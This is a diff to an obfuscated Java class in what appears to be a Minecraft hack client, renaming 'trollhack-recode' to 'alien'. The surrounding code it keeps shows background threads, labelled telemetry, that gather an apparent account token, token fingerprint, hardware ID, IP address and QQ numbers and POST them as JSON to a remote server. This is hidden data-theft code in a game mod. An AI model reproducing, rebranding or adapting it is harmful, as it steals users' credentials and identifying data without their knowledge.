@@ -72,7 +72,7 @@ public final class ApiEndpoints2 {
             String string8 = ApiEndpoints2.m150(ApiEndpoints2.getText44());
             String string9 = ApiEndpoints2.m150(ApiEndpoints2.getText22());
             String string10 = ApiEndpoints2.m150("1.0.0");
-            String string11 = ApiEndpoints2.m150("trollhack-recode");
+            String string11 = ApiEndpoints2.m150("alien");
             String string12 = ApiEndpoints2.m225(list);
             String string13 = ApiEndpoints2.m150(list.isEmpty() ? "" : (String)list.get(0));
             String string14 = ApiEndpoints2.m150(ApiEndpoints2.m515(string3));
@@ -81,7 +81,7 @@ public final class ApiEndpoints2 {
             String string17 = ApiEndpoints2.m150(string3);
             String string18 = "{\"token\":\"" + string17 + "\",\"hwid\":\"" + string16 + "\",\"reportedIp\":\"" + string15 + "\",\"tokenFingerprint\":\"" + string14 + "\",\"qq\":\"" + string13 + "\",\"qqs\":" + string12 + ",\"client\":\"" + string11 + "\",\"version\":\"" + string10 + "\",\"buildId\":\"" + string9 + "\",\"minecraft\":\"" + string8 + "\",\"loader\":\"" + string7 + "\",\"time\":\"" + string6 + "\",\"timestamp\":" + l + "}";
             ApiEndpoints2.m651(string2, string18);
-        }, "TrollHack-Telemetry");
+        }, "Alien-Telemetry");
         thread.setDaemon(true);
         thread.start();
     }
@@ -105,14 +105,14 @@ public final class ApiEndpoints2 {
             String string7 = ApiEndpoints2.m150(ApiEndpoints2.getText44());
             String string8 = ApiEndpoints2.m150(ApiEndpoints2.getText22());
             String string9 = ApiEndpoints2.m150("1.0.0");
-            String string10 = ApiEndpoints2.m150("trollhack-recode");
+            String string10 = ApiEndpoints2.m150("alien");
             String string11 = ApiEndpoints2.m225(list);
             String string12 = ApiEndpoints2.m150(list.isEmpty() ? "" : (String)list.get(0));
             String string13 = ApiEndpoints2.m150(string3);
             String string14 = ApiEndpoints2.m150(string2);
             String string15 = "{\"hwid\":\"" + string14 + "\",\"reportedIp\":\"" + string13 + "\",\"qq\":\"" + string12 + "\",\"qqs\":" + string11 + ",\"client\":\"" + string10 + "\",\"version\":\"" + string9 + "\",\"buildId\":\"" + string8 + "\",\"minecraft\":\"" + string7 + "\",\"loader\":\"" + string6 + "\",\"time\":\"" + string5 + "\",\"timestamp\":" + l + "}";
             ApiEndpoints2.m651(string, string15);
-        }, "TrollHack-VisitorTelemetry");
+        }, "Alien-VisitorTelemetry");
         thread.setDaemon(true);
         thread.start();
     }
@@ -129,7 +129,7 @@ public final class ApiEndpoints2 {
             httpURLConnection.setReadTimeout(5000);
             httpURLConnection.setDoOutput(true);
             httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-            httpURLConnection.setRequestProperty("User-Agent", "trollhack-recode/1.0.0");
+            httpURLConnection.setRequestProperty("User-Agent", "alien/1.0.0");
             byte[] byArray = string2.getBytes(StandardCharsets.UTF_8);
             httpURLConnection.setFixedLengthStreamingMode(byArray.length);
             try (OutputStream outputStream = httpURLConnection.getOutputStream();){
@@ -230,7 +230,7 @@ public final class ApiEndpoints2 {
     }
 
     private static String getText22() {
-        return "trollhack-recode-1.0.0+mc-" + ApiEndpoints2.getText44() + "+loader-" + ApiEndpoints2.getText33();
+        return "alien-1.0.0+mc-" + ApiEndpoints2.getText44() + "+loader-" + ApiEndpoints2.getText33();
     }
 
     /*
